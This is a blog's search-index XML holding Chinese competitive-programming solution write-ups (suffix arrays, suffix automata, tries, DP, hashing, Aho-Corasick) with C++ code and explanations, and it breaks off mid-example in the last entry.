<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[NewHexo]]></title>
    <url>%2Fposts%2FNewHexo%2F</url>
    <content type="text"><![CDATA[NewHexo NewHexo]]></content>
      <categories>
        <category>NewHexo</category>
      </categories>
      <tags>
        <tag>NewHexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HDU 4436 str2int]]></title>
    <url>%2Fposts%2FHDU%204436%20str2int%2F</url>
    <content type="text"><![CDATA[HDU 4436 str2int HDU 4436 str2int题意给出$n$个串，问这些串中所有不同的子串可组成的数字之和模$2012$的结果是多少？ 思路后缀数组 定义前缀和$sigma[i] = s_0 + s_0s_1 + s_0s_1s_2 + … + (s_0s_1s_2s_3s_4…s_i)$ 这一连续的整数值定义$rest[i] = s_0s_1s_2s_3s_4…s_i$ 也就是说$sigma[i]$是$rest[i]$的前缀和 例如对于字符串 $s = “12345” $ $sigma[0] = 1, sigma[1] = 1 + 12, sigma[3] = 1 + 12 + 123…$ $rest[0] = 1, rest[1] = 12, rest[3] = 123…$ 对于用未出现字符隔开的连起来的总串, 预处理出$sigma, rest$数组 用$tens[i]$ 表示$(∑10^j) \% 2012 (1 &lt;= j &lt;= i)$ 就和容易找到连续的起点在$sa[i]$, 终点在$(sa[i] + height[i] , i)$所在字符串的整数值的和了 例如对于$“12345” $查询$3 + 34 + 345$: $3 + 34 + 345 $ $= (123 + 1234 + 12345) - 12*(10 + 100 + 1000)$ $= (sigma[4] - sigma[1] + 2012 - rest[1]*tens[3]) % 2012$ 题解代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include&lt;bits/stdc++.h&gt;using namespace std;const int mod = 2012;#define maxn 1000010int wa[maxn], wb[maxn], wv[maxn], Ws[maxn];int cmp(int *r, int a, int b, int l)&#123; return r[a] == r[b] &amp;&amp; r[a + l] == r[b + l];&#125;void da(int *r, int *sa, int n, int m)&#123; int *x = wa, *y = wb, *t, i, j, p; for(i = 0; i &lt; m; i++) Ws[i] = 0; for(i = 0; i &lt; n; i++) Ws[x[i] = r[i]]++; for(i = 1; i &lt; m; i++) Ws[i] += Ws[i - 1]; for(i = n - 1; i &gt;= 0; i--) sa[--Ws[x[i]]] = i; for(j = 1, p = 1; p &lt; n; j *= 2, m = p) &#123; for(p = 0, i = n - j; i &lt; n; i++) y[p++] = i; for(i = 0; i &lt; n; i++) if(sa[i] &gt;= j) y[p++] = sa[i] - j; for(i = 0; i &lt; n; i++) wv[i] = x[y[i]]; for(i = 0; i &lt; m; i++) Ws[i] = 0; for(i = 0; i &lt; n; i++) Ws[wv[i]]++; for(i = 1; i &lt; m; i++) Ws[i] += Ws[i - 1]; for(i = n - 1; i &gt;= 0; i--) sa[--Ws[wv[i]]] = y[i]; for(t = x, x = y, y = t, p = 1, x[sa[0]] = 0, i = 1; i &lt; n; i++) x[sa[i]] = cmp(y, sa[i - 1], sa[i], j) ? p - 1 : p++; &#125; return;&#125; int rank[maxn], height[maxn];void calheight(int *r, int *sa, int n)&#123; int i, j, k = 0; for(i = 1; i &lt;= n; i++) rank[sa[i]] = i; for(i = 0; i &lt; n; height[rank[i++]] = k) for(k ? k-- : 0, j = sa[rank[i] - 1]; r[i + k] == r[j + k]; k++); return;&#125; int n, N;char in[maxn];int s[maxn], sa[maxn];int end[maxn];int sigma[maxn];int rest[maxn];int tens[maxn]; int main()&#123; while(scanf("%d", &amp;n) != EOF) &#123; N = 0; for(int i = 0; i &lt; n; i++) &#123; scanf("%s", in); int tmp = strlen(in); int pos = N + tmp - 1; for(int j = 0; j &lt; tmp; j++) &#123; end[N] = pos; s[N++] = in[j] - '0' + 1; &#125; end[N] = pos; s[N++] = 11; &#125; N--; s[N] = 0; da(s, sa, N + 1, 12); calheight(s, sa, N); memset(sigma, 0, sizeof(sigma)); memset(rest, 0, sizeof(rest)); memset(tens, 0, sizeof(tens)); rest[0] = (s[0] - 1) % mod; sigma[0] = rest[0]; tens[0] = 0; int ten = 1; for(int i = 1; i &lt;= N; i++) &#123; rest[i] = (rest[i - 1] * 10 + s[i] - 1) % mod; sigma[i] = (sigma[i - 1] + rest[i]) % mod; ten = ten*10 % mod; tens[i] = (tens[i - 1] + ten) % mod; &#125; int ans = 0; for(int i = 1; i &lt;= N; i++) &#123; if(s[sa[i]] == 1) continue; int start = sa[i] + height[i]; int tail = end[sa[i]]; if(tail &lt; start) continue; if(start == 0) ans = (ans + sigma[tail]) % mod; else ans = (ans + sigma[tail] - sigma[start - 1] + mod - rest[sa[i] - 1] * (tens[tail - sa[i] + 1] - tens[start - sa[i]] + mod) % mod + mod) % mod; &#125; printf("%d\n", ans); &#125; return 0;&#125; 思路后缀自动机 将所有串中间中$10$隔开连接起来建立后缀自动机, 然后从根节点开始按照拓扑序向下遍历 计算出到达每一个结点的方案数(不能沿着$10$走,根节点还不能沿着$0$走) 然后对于状态 $s$ 经过边 $j$ 到达 $t$ 状态 $t$ 状态中从$s$转移来的字符串的贡献是 $s$ 状态中字符串的贡献*$10$ + $j$*$s$中不同满足条件的字符串数量, 最后拓扑序遍历即可 题解代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#include&lt;bits/stdc++.h&gt;using namespace std;#define maxn 222000#define maxm 111000 const int mod = 2012; struct Suffix_Automation&#123; struct State &#123; State *par; State *go[12]; int right, val, mi, sum, cnt; void init(int _val) &#123; par = 0, val = _val, right = mi = sum = cnt = 0; memset(go, 0, sizeof(go)); &#125; &#125;; State *root, *last, *cur; State nodePool[maxn]; State* newState(int val = 0) &#123; cur-&gt;init(val); return cur++; &#125; void initSAM() &#123; cur = nodePool; root = newState(); last = root; &#125; void extend(int w, int len) &#123; State *p = last; State *np = newState(p-&gt;val + 1); np-&gt;right = 1; while(p &amp;&amp; p-&gt;go[w] == 0) &#123; p-&gt;go[w] = np; p = p-&gt;par; &#125; if(p == 0) &#123; np-&gt;par = root; &#125; else &#123; State *q = p-&gt;go[w]; if(q-&gt;val == p-&gt;val + 1) &#123; np-&gt;par = q; &#125; else &#123; State *nq = newState(p-&gt;val + 1); memcpy(nq-&gt;go, q-&gt;go, sizeof(q-&gt;go)); nq-&gt;par = q-&gt;par; q-&gt;par = nq; np-&gt;par = nq; while(p &amp;&amp; p-&gt;go[w] == q) &#123; p-&gt;go[w] = nq; p = p-&gt;par; &#125; &#125; &#125; last = np; &#125; int d[maxm]; State *b[maxn]; void topo() &#123; int cnt = cur - nodePool; int maxVal = 0; memset(d, 0, sizeof(d)); for(int i = 1; i &lt; cnt; i++) maxVal = max(maxVal, nodePool[i].val), d[nodePool[i].val]++; for(int i = 1; i &lt;= maxVal; i++) d[i] += d[i - 1]; for(int i = 1; i &lt; cnt; i++) b[d[nodePool[i].val]--] = &amp;nodePool[i]; b[0] = root; &#125;&#125;; Suffix_Automation sam;char s[maxn];int pre[maxn]; int main()&#123; int n; while(~scanf("%d", &amp;n)) &#123; sam.initSAM(); while(n--) &#123; scanf("%s", s); int len = strlen(s); for(int i = 0; i &lt; len; i++) sam.extend(s[i] - '0', i + 1); sam.extend(10, -1); &#125; sam.topo(); int ans = 0; int cnt = sam.cur - sam.nodePool; sam.b[0]-&gt;cnt = 1; for(int i = 0; i &lt; cnt; i++) &#123; for(int j = 0; j &lt; 10; j++) &#123; if(!i &amp;&amp; !j) continue; if(!sam.b[i]-&gt;go[j]) continue; sam.b[i]-&gt;go[j]-&gt;sum = (sam.b[i]-&gt;go[j]-&gt;sum + sam.b[i]-&gt;sum*10 + sam.b[i]-&gt;cnt*j) % mod; sam.b[i]-&gt;go[j]-&gt;cnt = (sam.b[i]-&gt;go[j]-&gt;cnt + sam.b[i]-&gt;cnt) % mod; &#125; ans = (ans + sam.b[i]-&gt;sum) % mod; &#125; printf("%d\n", ans); &#125; return 0;&#125;]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Suffix Array</tag>
        <tag>Suffix Automaton</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF427 D Match & Catch]]></title>
    <url>%2Fposts%2FCF427%20D%20Match%20%26%20Catch%2F</url>
    <content type="text"><![CDATA[CF427 D Match & Catch CF427 D Match &amp; Catch题意给出两个字符串，求出两个字符串中的最短公共子串，且在每个字符串中只出现过一次 思路考虑把两个字符串合并起来，求出$sa$，$rk$和$Height$数组，我们可以从小到大枚举子串长度$k$，然后再枚举后缀 具体来说，我们是根据子串字典序从小到大枚举后缀的，如果$Height[i]$不小于$k$ （即第$i-1$个子串和第$i$个子串的最长公共前缀不小于$k$），并且如果此后缀的起始点在第一个字符串 则$cnt1++$，否则$cnt2++$ $cnt1$和$cnt2$分别代表最长公共子串出现在第一个字符串和第二个字符串的次数 由于是连续更新的，所以假如上一轮$cnt1=1$，现在更新$cnt2=1$ 那么说明这两个子符串有相同的长度大于$k$的公共子串，但是不是唯一还不知道 也就是说这个数字只在两轮更新中有用，如果$cnt1&gt;1$或$cnt2&gt;1$都没有价值了 （要么没有公共子串，要么有重复的） 如果要确保唯一性，就要当$Height[i]$枚举到小于$k$的时候，如果此时$cnt1 == 1 $ $and$ $ cnt2 == 1$的话，则有解。 题解代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;string s1, s2, str;int len1, tot, m;const int MAXN = 10004;int a[MAXN], Height[MAXN], tax[MAXN], tp[MAXN], sa[MAXN], rk[MAXN];void RSort()&#123; for (int i = 1; i &lt;= m; i++) tax[i] = 0; for (int i = 1; i &lt;= tot; i++) tax[rk[i]]++; for (int i = 1; i &lt;= m; i++) tax[i] += tax[i - 1]; for (int i = tot; i &gt;= 1; i--) sa[tax[rk[tp[i]]]--] = tp[i];&#125;bool cmp(int *f, int x, int y, int w)&#123; return f[x] == f[y] &amp;&amp; f[x + w] == f[y + w];&#125;void Suffix()&#123; m = 127; for (int i = 1; i &lt;= tot; i++) rk[i] = a[i], tp[i] = i; int p = 0; RSort(); for (int w = 1; p &lt; tot; w += w, m = p) &#123; p = 0; for (int i = tot - w + 1; i &lt;= tot; i++) tp[++p] = i; for (int i = 1; i &lt;= tot; i++) if (sa[i] &gt; w) tp[++p] = sa[i] - w; RSort(); swap(rk, tp); rk[sa[1]] = p = 1; for (int i = 2; i &lt;= tot; i++) rk[sa[i]] = cmp(tp, sa[i], sa[i - 1], w) ? p : ++p; &#125; int j = 0, k = 0; for (int i = 1; i &lt;= tot; Height[rk[i++]] = k) &#123; for (k = k ? k - 1 : k, j = sa[rk[i] - 1]; a[i + k] == a[j + k]; k++) ; &#125;&#125;bool solve(int k, int div)&#123; int cnt1 = 0, cnt2 = 0; for (int i = 1; i &lt;= tot; i++) &#123; if (Height[i] &lt; k) &#123; if (cnt1 == 1 &amp;&amp; cnt2 == 1) &#123; return true; &#125; cnt1 = 0; cnt2 = 0; if (sa[i] &lt;= div) cnt1++; else if (sa[i] &gt;= div) cnt2++; continue; &#125; if (sa[i] &lt;= div) cnt1++; else if (sa[i] &gt;= div) cnt2++; &#125; return cnt1 == 1 &amp;&amp; cnt2 == 1; //如果枚举完了也要判断一下&#125;int main()&#123; cin &gt;&gt; s1 &gt;&gt; s2; len1 = s1.length(); str = s1 + '#' + s2; //将两个字符串隔开来，避免sa等数组重叠 tot = len1 + s2.length() + 1; for (int i = 1; i &lt;= tot; i++) a[i] = str[i - 1]; Suffix(); //后缀数组 int ans = -1; for (int i = 1; i &lt;= len1; i++) &#123; //枚举长度 if (solve(i, len1)) &#123; ans = i; break; &#125; &#125; printf("%d\n", ans); return 0;&#125; 重点解析1234/*后缀数组:https://blog.csdn.net/Astinli/article/details/82495530*/]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Suffix Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF1285 D Dr. Evil Underscores]]></title>
    <url>%2Fposts%2FCF1285%20D%20Dr.%20Evil%20Underscores%2F</url>
    <content type="text"><![CDATA[CF1285 D Dr. Evil Underscores CF1285 D Dr. Evil Underscores题意给出$n$个数字，现在要求出一个$X$，使得$X$与$n$个数字单独异或之后的最大值最小 思路数字的范围是$(0 \leq a_i \leq 2^{30})$ 也就是用树的层级来模拟幂级，然后读入$a_i$一位位二进制插入 最后$dfs$找的时候看这一位的左右儿子 如果这一位$0$和$1$同时存在，也就是$X$这一位不管是什么，最后的答案的这一位也得是$1$ 如果这一位只有一个，$X$这一位就取反，最后答案这一位就是$0$ 题解代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long LL;const int inf = 0x3f3f3f3f;const int N = 1e5 + 100;int trie[N * 32][2], cnt = 0;void insert(int x)&#123; int pos = 0; for (int i = 31; i &gt;= 0; i--) &#123; int to = (x &gt;&gt; i) &amp; 1; if (!trie[pos][to]) trie[pos][to] = ++cnt; pos = trie[pos][to]; //cout &lt;&lt; i &lt;&lt; ":" &lt;&lt; pos &lt;&lt; " " &lt;&lt; to &lt;&lt; " " &lt;&lt; pos &lt;&lt; endl; &#125;&#125;int dfs(int step, int pos)&#123; if (step == -1) return 0; if (!trie[pos][0]) return dfs(step - 1, trie[pos][1]); if (!trie[pos][1]) return dfs(step - 1, trie[pos][0]); //cout &lt;&lt; (1 &lt;&lt; step) &lt;&lt; endl; return min(dfs(step - 1, trie[pos][0]), dfs(step - 1, trie[pos][1])) | (1 &lt;&lt; step);&#125;int main()&#123; int n; scanf("%d", &amp;n); while (n--) &#123; int num; scanf("%d", &amp;num); insert(num); &#125; printf("%d\n", dfs(31, 0)); getchar(); getchar(); return 0;&#125; 重点解析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143/*字典树上述博客讲的很清楚了这里我们看看怎么dfs的*/int dfs(int step, int pos)&#123; if (step == -1)//到底了都没搜到0和1都有的就直接输出0 return 0; if (!trie[pos][0])//没0走1 return dfs(step - 1, trie[pos][1]); if (!trie[pos][1])//没1走0 return dfs(step - 1, trie[pos][0]); return min(dfs(step - 1, trie[pos][0]), dfs(step - 1, trie[pos][1])) | (1 &lt;&lt; step); //如果这一位0和1都有，那么这一位直接输出1乘上目前的权值,然后继续往下搜索 //往下走有两条路，选择最后结果少的那个&#125;/*画图比较好理解用样例：31 2 3*/void insert(int x)&#123; int pos = 0; for (int i = 31; i &gt;= 0; i--) &#123; int to = (x &gt;&gt; i) &amp; 1; if (!trie[pos][to]) trie[pos][to] = ++cnt; pos = trie[pos][to]; cout &lt;&lt; i &lt;&lt; ":" &lt;&lt; pos &lt;&lt; " " &lt;&lt; to &lt;&lt; " " &lt;&lt; pos &lt;&lt; endl; &#125;&#125;/*1，2，3在字典树中的存储就很简单了31:1 0 130:2 0 229:3 0 328:4 0 427:5 0 526:6 0 625:7 0 724:8 0 823:9 0 922:10 0 1021:11 0 1120:12 0 1219:13 0 1318:14 0 1417:15 0 1516:16 0 1615:17 0 1714:18 0 1813:19 0 1912:20 0 2011:21 0 2110:22 0 229:23 0 238:24 0 247:25 0 256:26 0 265:27 0 274:28 0 283:29 0 292:30 0 301:31 0 310:32 1 32 //看到了131:1 0 130:2 0 229:3 0 328:4 0 427:5 0 526:6 0 625:7 0 724:8 0 823:9 0 922:10 0 1021:11 0 1120:12 0 1219:13 0 1318:14 0 1417:15 0 1516:16 0 1615:17 0 1714:18 0 1813:19 0 1912:20 0 2011:21 0 2110:22 0 229:23 0 238:24 0 247:25 0 256:26 0 265:27 0 274:28 0 283:29 0 292:30 0 301:33 1 33 //二进制下的20:34 0 34 //二进制下的231:1 0 130:2 0 229:3 0 328:4 0 427:5 0 526:6 0 625:7 0 724:8 0 823:9 0 922:10 0 1021:11 0 1120:12 0 1219:13 0 1318:14 0 1417:15 0 1516:16 0 1615:17 0 1714:18 0 1813:19 0 1912:20 0 2011:21 0 2110:22 0 229:23 0 238:24 0 247:25 0 256:26 0 265:27 0 274:28 0 283:29 0 292:30 0 301:33 1 33 //二进制下的30:35 1 35 //二进制下的3然后缩减一下就是 0 0 1 * 1 0 1//第一层的儿子有0和1，这一位直接return min(dfs) |(1&lt;&lt;step)//这一位的层数是31也就是这一位有个1&lt;&lt;1也就是2//左边的0下去就是1，再下去就是step==-1，输出0//右边的1有两个孩子输出直接输出1//所以上一层的min选左边的0最后输出2+0=0*/]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Trie Tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF1096 D Easy Problem]]></title>
    <url>%2Fposts%2FCF1096%20D%20Easy%20Problem%2F</url>
    <content type="text"><![CDATA[CF1096 D Easy Problem CF1096 D Easy Problem题意给定一个字符串，每个字符自带权值，让你删去一些，使得不存在子序列$”hard”$，问最小的权值是多少 思路因为有顺序问题，所以我们记录维护到当前最长的前缀的代价 状压$dp$ 题解代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;bits/stdc++.h&gt;using namespace std;#define ll long longconst int maxn = 200010;int a[maxn], Laxt[maxn];ll dp[maxn][5], ans;char c[maxn];int id(char s) //状压&#123; if (s == 'h') return 1; if (s == 'a') return 2; if (s == 'r') return 3; if (s == 'd') return 4; return -1;&#125;void ADD(ll &amp;x, ll y)&#123; if (y == -1) //用于更新的是空 return; if (x == -1) //直接更新 x = y; else x = min(x, y); //取代价小的&#125;int main()&#123; int N; scanf("%d%s", &amp;N, c + 1); memset(dp, -1, sizeof(dp)); for (int i = 1; i &lt;= N; i++) scanf("%d", &amp;a[i]); dp[0][0] = 0; for (int i = 1; i &lt;= N; i++) &#123; int p = id(c[i]); if (p == -1) //不是子序列的一员 &#123; for (int j = 0; j &lt;= 4; j++) dp[i][j] = dp[i - 1][j]; continue; &#125; if (dp[i - 1][p - 1] != -1) //当前一位的代价不为空 ADD(dp[i][p - 1], dp[i - 1][p - 1] + a[i]); //就将这一位更新 ADD(dp[i][p], dp[i - 1][p - 1]); //更新目前的最小值 for (int j = 0; j &lt;= 4; j++) //其它字母的dp更新 &#123; if (j == p - 1) continue; ADD(dp[i][j], dp[i - 1][j]); &#125; &#125; ans = 1LL &lt;&lt; 60; //最大值 for (int i = 0; i &lt;= 3; i++) if (dp[N][i] != -1) //存在 ans = min(ans, dp[N][i]); printf("%lld\n", ans); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UVa 11019 Matrix Matcher]]></title>
    <url>%2Fposts%2FUVa%2011019%20Matrix%20Matcher%2F</url>
    <content type="text"><![CDATA[UVa 11019 Matrix Matcher UVa 11019 Matrix Matcher题意从$n\times m$的字符矩阵中找到有多少个$x\times y$的字符矩阵 思路二维$Hash$后，遍历一遍所有大小为$x\times y$的矩阵和给定的矩阵哈希值相比较即可 题解代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int N = 1e6+5;const ll mod = 1e9+7;#define a 321#define b 207int n,m,x,y;ll h1[1100][1100],h2[1100][1100];char T[1100][1100],P[110][110];void init()&#123; memset(h1,0,sizeof(h1)); memset(h2,0,sizeof(h2));&#125;int main()&#123; int cas; scanf("%d",&amp;cas); while(cas--) &#123; init(); int sum=0; ll ta=1,tb=1;; scanf("%d%d",&amp;n,&amp;m);//长宽 for(int i=0;i&lt;n;i++) scanf("%s",T[i]); scanf("%d%d",&amp;x,&amp;y);//长宽 for(int i=0;i&lt;x;i++) scanf("%s",P[i]); //这里记录权值，不用pow是因为精度问题 for(int i=1;i&lt;=y;i++) ta*=a; for(int i=1;i&lt;=x;i++) tb*=b; ll ans=0; for(int i=0;i&lt;x;i++) for(int j=0;j&lt;y;j++) h1[i][0]=h1[i][0]*a+P[i][j]; for(int i=0;i&lt;x;i++) ans=ans*b+h1[i][0]; //把小矩阵hash值记录，便于等下遍历 init(); for(int i=0;i&lt;n;i++) &#123; for(int j=0;j&lt;y;j++) h1[i][0]=h1[i][0]*a+T[i][j]; for(int j=1;j+y&lt;=m;j++) h1[i][j]=h1[i][j-1]*a+T[i][j+y-1]-T[i][j-1]*ta; &#125; for(int j=0;j&lt;m;j++) &#123; for(int i=0;i&lt;x;i++) h2[0][j]=h2[0][j]*b+h1[i][j]; for(int i=1;i+x&lt;=n;i++) h2[i][j]=h2[i-1][j]*b+h1[i+x-1][j]-h1[i-1][j]*tb; &#125; //处理大矩阵hash for(int i=0;i+x&lt;=n;i++) for(int j=0;j+y&lt;=m;j++) if(h2[i][j]==ans) sum++; //遍历一边就行了 printf("%d\n",sum); &#125; return 0;&#125; 重点解析1234567891011121314151617181920212223242526272829303132333435363738/*唯一的难点就是二维hash的实现先看小矩阵的实现a,b两个基数玄学质数*/for(int i=0;i&lt;x;i++) for(int j=0;j&lt;y;j++) h1[i][0]=h1[i][0]*a+P[i][j]; //等价于用x个一维数组求得每一行的hashfor(int i=0;i&lt;x;i++) ans=ans*b+h1[i][0]; //所有行的hash合起来 //最后就能得到整个小矩阵的总hash值//再看大矩阵的hashfor(int i=0;i&lt;n;i++)&#123; for(int j=0;j&lt;y;j++) h1[i][0]=h1[i][0]*a+T[i][j]; //先处理出一个小矩阵宽度y的hash，然后hash值存在头位置 for(int j=1;j+y&lt;=m;j++) h1[i][j]=h1[i][j-1]*a+T[i][j+y-1]-T[i][j-1]*ta; //往后滚，下一个小矩阵宽度y的hash值： //等于目前的hash总值，加上小矩阵宽度的后一个，减去目前的第一个 //注意第一个我们是从0到j-1，所以第二个是1到j&#125;//每一行都做一次for(int j=0;j&lt;m;j++)&#123; for(int i=0;i&lt;x;i++) h2[0][j]=h2[0][j]*b+h1[i][j]; //先处理出把这一列中一个小矩阵长度的hash合起来 for(int i=1;i+x&lt;=n;i++) h2[i][j]=h2[i-1][j]*b+h1[i+x-1][j]-h1[i-1][j]*tb; //往下滚&#125;//最后处理出来的h2数组，每个小矩阵大小的矩阵的hash值都在它的左上角//最后直接比对就行了]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF710 F String Set Queries]]></title>
    <url>%2Fposts%2FCF710%20F%20String%20Set%20Queries%2F</url>
    <content type="text"><![CDATA[CF710 F String Set Queries CF710 F String Set Queries题意维护一个字符串集合，支持三种操作： 加字符串 删字符串 查询集合中的所有字符串在给出的模板串中出现的次数 本题强制在线，应该在每次输入后调用fflush(stdout)，你只有在输出上一个询问的答案后才能读入下一组询问。 思路开两套AC自动机，一个插入一个删除，最后插入减去删除 题解代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;bits/stdc++.h&gt;using namespace std;int gi() //快读&#123; int x = 0, w = 1; char ch = getchar(); while ((ch &lt; '0' || ch &gt; '9') &amp;&amp; ch != '-') ch = getchar(); if (ch == '-') w = 0, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + ch - '0', ch = getchar(); return w ? x : -x;&#125;const int N = 3e5 + 5;struct AC&#123; int son[26][N], end[N], tr[26][N], fa[N], cnt[N], tot; int rt[N], sz[N], top; queue&lt;int&gt; Q; void getfail(int RT) &#123; for (int i = 0; i &lt; 26; ++i) if (son[i][RT]) fa[tr[i][RT] = son[i][RT]] = RT, Q.push(tr[i][RT]); else tr[i][RT] = RT; while (!Q.empty()) &#123; int u = Q.front(); Q.pop(); for (int i = 0; i &lt; 26; ++i) if (son[i][u]) &#123; tr[i][u] = son[i][u], fa[tr[i][u]] = tr[i][fa[u]]; Q.push(tr[i][u]); &#125; else tr[i][u] = tr[i][fa[u]]; cnt[u] = end[u] + cnt[fa[u]]; &#125; &#125; int merge(int x, int y) &#123; if (!x || !y) return x | y; end[x] += end[y]; for (int i = 0; i &lt; 26; ++i) son[i][x] = merge(son[i][x], son[i][y]); return x; &#125; void insert(char *s, int n) &#123; rt[++top] = ++tot; sz[top] = 1; int x = rt[top]; for (int i = 1; i &lt;= n; ++i) &#123; if (!son[s[i] - 'a'][x]) son[s[i] - 'a'][x] = ++tot; x = son[s[i] - 'a'][x]; &#125; end[x] = 1; while (sz[top] == sz[top - 1]) &#123; --top; rt[top] = merge(rt[top], rt[top + 1]); sz[top] += sz[top + 1]; &#125; getfail(rt[top]); &#125; int query(char *s, int n) &#123; int res = 0; for (int i = 1; i &lt;= top; ++i) for (int j = 1, x = rt[i]; j &lt;= n; ++j) x = tr[s[j] - 'a'][x], res += cnt[x]; return res; &#125;&#125; T1, T2;char s[N];int main()&#123; int m = gi(); while (m--) &#123; int op = gi(); scanf("%s", s + 1); int n = strlen(s + 1); if (op == 1) T1.insert(s, n); if (op == 2) T2.insert(s, n); if (op == 3) printf("%d\n", T1.query(s, n) - T2.query(s, n)), fflush(stdout); &#125; return 0;&#125; 重点解析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/*字典树:https://www.colabug.com/2018/0905/4379063/AC自动机:https://www.cnblogs.com/hyfhaha/p/10802604.html*//*AC自动机模板自我理解:*/void getFail() //建立fail指针&#123; for (int i = 0; i &lt; 26; i++) //初始化0的所有儿子都是1 trie[0].son[i] = 1; q.push(1); //将根压入队列 trie[1].fail = 0; //第一层的fail都指向0 while (!q.empty()) &#123; int u = q.front(); q.pop(); for (int i = 0; i &lt; 26; i++) //遍历所有儿子 &#123; int v = trie[u].son[i]; //处理u的i儿子的fail int Fail = trie[u].fail; //trie[Fail].son[i]就是和v值相同的点 if (!v) //不存在 &#123; trie[u].son[i] = trie[Fail].son[i];//直接让这一位等于后缀的下一位 continue; &#125; trie[v].fail = trie[Fail].son[i]; //第三种情况，直接指就可以了 q.push(v); //存在实节点才压入队列 &#125; &#125;&#125;int query(char *s)&#123; //查询 int u = 1, ans = 0, len = strlen(s); for (int i = 0; i &lt; len; i++) &#123; int v = s[i] - 'a'; int k = trie[u].son[v]; //跳Fail while (k &gt; 1 &amp;&amp; trie[k].flag != -1) &#123; //经过就不统计了 ans += trie[k].flag, trie[k].flag = -1; //累加上这个位置的模式串个数，标记已经过 k = trie[k].fail; //继续跳Fail &#125; u = trie[u].son[v]; //到儿子那,存在性看上面的第二种情况 &#125; return ans;&#125;]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Aho-Corasick Automaton</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF985 F Isomorphic Strings]]></title>
    <url>%2Fposts%2FCF985%20F%20Isomorphic%20Strings%2F</url>
    <content type="text"><![CDATA[CF985 F Isomorphic Strings CF985 F Isomorphic Strings题意给你一个完整字符串,长度为$n$,接下来有$m$个询问 每个询问包括三个关键字$x,y,len$起点$1$,起点$2$和长度 我们需要判断以$x$为起点长度为$len$的字串和以$y$为起点的长度为$len$的子串的映射是否合法 若合法输出$YES$,否则输出$NO$ 思路因为是问两个子串的映射是否合法，那么我们可以使用$Hash$ 对每个位置上的$26$个字母$Hash$后,每个位置上的不同字母都会有一个$Hash$值，每种字母的$Hash$独立 我们用$p$数组来存储权值差，用$get$函数求得从$start$开始长为$len$的字符串的$Hash$值 当我们把两个字符串的$26$种字母$Hash$值求出后，分别排序后比对，如果相同那就映射成立 题解代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const ll base = 131, mod = 1e9 + 7;const int N = 2e5 + 7; ll l, r, len, n, m;char s[N];ll p[N], hs[N][30];void Hash()&#123; for (ll i = 1; i &lt;= n; i++) for (ll j = 1; j &lt;= 26; j++) hs[i][j] = (hs[i - 1][j] * base % mod + (ll)(s[i] == ('a' + j - 1))) % mod; p[0] = 1; for (ll i = 1; i &lt;= n; i++) p[i] = p[i - 1] * base % mod;&#125;ll get(ll start,ll i)&#123; return (hs[start + len - 1][i] - p[len] * hs[start - 1][i] % mod + mod) % mod;&#125;bool check()&#123; ll a[27], b[27]; for (ll i = 1; i &lt;= 26; i++) &#123; a[i] = get(l,i); b[i] = get(r,i); //printf("%lld: a[%lld]=%lld b[%lld]=%lld\n", i, i, a[i], i, b[i]); &#125; sort(a + 1, a + 27); sort(b + 1, b + 27); for (ll i = 1; i &lt;= 26; i++) if (a[i] != b[i]) return false; return true;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; m; scanf("%s", s + 1); Hash(); while (m--) &#123; cin &gt;&gt; l &gt;&gt; r &gt;&gt; len; if (check()) printf("YES\n"); else printf("NO\n"); &#125; return 0;&#125; 重点解析1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071bool check()&#123; ll a[27], b[27]; for (ll i = 1; i &lt;= 26; i++) &#123; a[i] = get(l,i); b[i] = get(r,i); //printf("%lld: a[%lld]=%lld b[%lld]=%lld\n", i, i, a[i], i, b[i]); &#125; sort(a + 1, a + 27); sort(b + 1, b + 27); for (ll i = 1; i &lt;= 26; i++) if (a[i] != b[i]) return false; return true;&#125;/*直接上样例解析input:7 4abacaba1 1 11 4 22 1 32 4 3output:YESYESNOYES分析第二组1 4 2abca1: a[1]=131 b[1]=12: a[2]=1 b[2]=03: a[3]=0 